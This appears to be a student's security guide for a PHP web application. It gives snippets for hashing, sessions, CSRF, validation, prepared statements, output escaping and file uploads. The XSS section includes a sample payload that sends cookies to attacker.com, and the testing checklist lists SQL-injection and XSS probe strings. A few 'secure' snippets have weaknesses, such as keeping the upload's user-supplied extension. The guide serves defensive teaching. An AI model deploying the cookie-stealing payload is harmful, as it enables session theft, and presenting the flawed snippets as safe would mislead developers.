# Security Requirements & Implementation

## 🔒 Critical Security Requirements (From Rubric)

These MUST be implemented to pass the "Secure" criteria (part of 80%).

---

## 1. Authentication & Authorization

### Implementation Checklist:

#### ✅ Password Hashing
```php
// src/Repositories/UserRepository.php

public function create(string $email, string $password): void
{
    $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
    
    $stmt = $this->pdo->prepare(
        'INSERT INTO users (email, password_hash, role) VALUES (?, ?, ?)'
    );
    $stmt->execute([$email, $hash, 'visitor']);
}

public function verifyPassword(string $plaintext, string $hash): bool
{
    return password_verify($plaintext, $hash);
}
```

#### ✅ Session Management
```php
// public/index.php or bootstrap/app.php

// Start with secure settings
session_set_cookie_params([
    'lifetime' => 3600,        // 1 hour
    'path' => '/',
    'domain' => $_SERVER['HTTP_HOST'] ?? 'localhost',
    'secure' => true,          // HTTPS only
    'httponly' => true,        // Prevent JS access
    'samesite' => 'Strict'      // CSRF protection
]);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
```

#### ✅ Admin Authorization on ALL Routes
```php
// In public/index.php - BEFORE dispatch

if (str_starts_with($path, '/admin')) {
    if (!\App\Framework\Auth::isAdmin()) {
        Flash::set('error', 'Admin access required.');
        Response::redirect('/login')->send();
        exit;
    }
}
```

#### ✅ CSRF Protection (Already implemented)
```php
// Every POST form includes:
<?= \App\Framework\Csrf::field() ?>

// On form submission:
if (!Csrf::verifyFromPost()) {
    Flash::set('error', 'Invalid CSRF token.');
    return Response::redirect('/previous-page');
}
```

---

## 2. Input Validation & Sanitization

### Server-Side Validation (REQUIRED)

#### ✅ Email Validation
```php
// src/Framework/Validator.php

class Validator
{
    public static function email(string $email): bool
    {
        return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
    }
    
    public static function emailUnique(string $email): bool
    {
        $repo = new UserRepository();
        return $repo->findByEmail($email) === null;
    }
}

// Usage in Controller:
if (!Validator::email($email)) {
    $errors[] = 'Invalid email format';
}
if (!Validator::emailUnique($email)) {
    $errors[] = 'Email already registered';
}
```

#### ✅ Password Validation
```php
class Validator
{
    public static function password(string $password): array
    {
        $errors = [];
        
        if (strlen($password) < 8) {
            $errors[] = 'Password must be at least 8 characters';
        }
        if (!preg_match('/[A-Z]/', $password)) {
            $errors[] = 'Password must contain uppercase letter';
        }
        if (!preg_match('/[0-9]/', $password)) {
            $errors[] = 'Password must contain number';
        }
        if (!preg_match('/[!@#$%^&*]/', $password)) {
            $errors[] = 'Password must contain special character';
        }
        
        return $errors;
    }
}
```

#### ✅ Number Validation (for prices, quantities)
```php
class Validator
{
    public static function positiveNumber(mixed $value): bool
    {
        return is_numeric($value) && (float)$value > 0;
    }
    
    public static function integer(mixed $value): bool
    {
        return filter_var($value, FILTER_VALIDATE_INT) !== false;
    }
}
```

#### ✅ String Length Validation
```php
class Validator
{
    public static function length(string $value, int $min, int $max): bool
    {
        $len = strlen($value);
        return $len >= $min && $len <= $max;
    }
}
```

#### ✅ Sanitization (Remove dangerous characters)
```php
// src/Framework/Sanitizer.php

class Sanitizer
{
    /**
     * Escape for HTML output (prevent XSS)
     */
    public static function html(string $value): string
    {
        return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    }
    
    /**
     * Sanitize for SQL (use with prepared statements)
     */
    public static function string(string $value): string
    {
        return trim(stripslashes($value ?? ''));
    }
    
    /**
     * Sanitize for URLs
     */
    public static function url(string $value): string
    {
        return filter_var($value, FILTER_SANITIZE_URL);
    }
}
```

---

## 3. SQL Injection Prevention

### ✅ ALWAYS Use Prepared Statements

**WRONG** (VULNERABLE):
```php
// ❌ DO NOT DO THIS
$query = "SELECT * FROM users WHERE email = '" . $email . "'";
$stmt = $pdo->query($query);
```

**CORRECT** (SAFE):
```php
// ✅ DO THIS
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');
$stmt->execute([$email]);
```

#### Example: Secure Repository
```php
// src/Repositories/EventRepository.php

final class EventRepository
{
    public function findById(int $id): ?array
    {
        $stmt = $this->pdo->prepare(
            'SELECT * FROM events WHERE id = ? LIMIT 1'
        );
        $stmt->execute([$id]);
        
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result ?: null;
    }
    
    public function create(string $title, string $date, string $category): void
    {
        $stmt = $this->pdo->prepare(
            'INSERT INTO events (title, event_date, category) VALUES (?, ?, ?)'
        );
        $stmt->execute([$title, $date, $category]);
    }
    
    public function updateById(int $id, string $title, string $date): void
    {
        $stmt = $this->pdo->prepare(
            'UPDATE events SET title = ?, event_date = ? WHERE id = ?'
        );
        $stmt->execute([$title, $date, $id]);
    }
}
```

---

## 4. XSS Prevention (Script Injection)

### ✅ Escape ALL User Output
```php
// In views - use h() helper function

// ❌ WRONG - Vulnerable to XSS
<h1><?= $title ?></h1>

// ✅ CORRECT - Safe
<h1><?= h($title) ?></h1>
```

#### Example in Form:
```php
// resources/views/events/form.php

<input type="text" name="title" value="<?= h($event['title'] ?? '') ?>">
<textarea><?= h($event['description'] ?? '') ?></textarea>
```

#### User Input Attack Example:
```html
<!-- User enters: -->
<script>fetch('http://attacker.com/steal?data=' + document.cookie)</script>

<!-- Without escaping, this runs! -->
<!-- With h() escaping, it displays as text -->
```

---

## 5. File Upload Security

### ✅ Secure File Upload Service
```php
// src/Services/FileUploadService.php

final class FileUploadService
{
    private const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
    private const MAX_SIZE = 5 * 1024 * 1024; // 5MB
    private const UPLOAD_DIR = __DIR__ . '/../../storage/uploads/';

    public function upload(array $file, string $folder): string
    {
        // 1. Validate file exists
        if (!isset($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
            throw new Exception('Invalid file upload');
        }

        // 2. Validate MIME type (check actual content, not just extension)
        $mimeType = mime_content_type($file['tmp_name']);
        if (!in_array($mimeType, self::ALLOWED_TYPES, true)) {
            throw new Exception('File type not allowed');
        }

        // 3. Validate file size
        if ($file['size'] > self::MAX_SIZE) {
            throw new Exception('File too large');
        }

        // 4. Generate safe filename (don't use user's filename)
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
        $filename = bin2hex(random_bytes(16)) . '.' . $extension;

        // 5. Create folder if needed
        $uploadPath = self::UPLOAD_DIR . $folder . '/';
        if (!is_dir($uploadPath)) {
            mkdir($uploadPath, 0755, true);
        }

        // 6. Move file
        $fullPath = $uploadPath . $filename;
        if (!move_uploaded_file($file['tmp_name'], $fullPath)) {
            throw new Exception('Failed to save file');
        }

        // 7. Return relative path for database
        return "/uploads/{$folder}/{$filename}";
    }
}
```

#### In Controller:
```php
public function uploadEventImage(): Response
{
    if (!isset($_FILES['image'])) {
        return Response::json(['error' => 'No file uploaded'], 400);
    }

    try {
        $service = new FileUploadService();
        $path = $service->upload($_FILES['image'], 'events');
        
        return Response::json(['image_url' => $path]);
    } catch (Exception $e) {
        return Response::json(['error' => $e->getMessage()], 400);
    }
}
```

---

## 6. Secure Routes & Page Rules

### ✅ Protect Sensitive Routes
```php
// routes/admin.php - ALL routes under /admin require admin role

// routes/web.php - Public routes
['GET', '/events', [EventController::class, 'index']], // Anyone
['POST', '/checkout', [OrderController::class, 'checkout']], // Logged in

// routes/admin.php - Admin only
['POST', '/admin/events/create', [EventAdminController::class, 'store']], // Admin
['POST', '/admin/events/delete', [EventAdminController::class, 'delete']], // Admin
```

### ✅ Validate User Identity
```php
// In controller - verify user owns the resource
public function editOrder(int $orderId): Response
{
    $userId = Auth::userId();
    
    $order = OrderRepository::findById($orderId);
    
    // Prevent user from editing others' orders
    if ($order['user_id'] !== $userId) {
        Flash::set('error', 'You do not have permission');
        return Response::redirect('/');
    }
    
    // Safe to edit
    return $this->render('order/edit', ['order' => $order]);
}
```

---

## 7. API Security (If using API routes)

### ✅ Validate Data Types
```php
public function createEvent(): Response
{
    $data = json_decode((string)file_get_contents('php://input'), true);
    
    if (!is_array($data)) {
        return Response::json(['error' => 'Invalid JSON'], 400);
    }
    
    $title = $data['title'] ?? null;
    $price = $data['price'] ?? null;
    
    if (!is_string($title) || !is_numeric($price)) {
        return Response::json(['error' => 'Invalid data types'], 400);
    }
    
    // Safe to process
}
```

---

## Security Testing Checklist

### Before Submitting, Test:
- [ ] Can't access `/admin` without login
- [ ] Session expires after 1 hour
- [ ] CSRF tokens validate on all forms
- [ ] Can't SQL inject (try: `' OR '1'='1`)
- [ ] XSS attempt blocked (try: `<script>alert('xss')</script>`)
- [ ] Invalid file types rejected on upload
- [ ] Oversized files rejected
- [ ] User can only edit own orders/info
- [ ] Admin can only be user with admin role
- [ ] Passwords hashed, not stored plain text

---

## Implementation Priority

1. ✅ Prepared Statements (CRITICAL - SQL Injection)
2. ✅ Password Hashing (CRITICAL - Auth)
3. ✅ Input Validation (CRITICAL - Data Integrity)
4. ✅ Output Escaping (CRITICAL - XSS)
5. ✅ CSRF Tokens (IMPORTANT - already implemented)
6. ✅ Authorization Checks (IMPORTANT - Access Control)
7. ✅ File Upload Security (IMPORTANT - File Safety)
8. ✅ Session Security (IMPORTANT - Data Protection)

Implement in this order to maximize security for your grade!

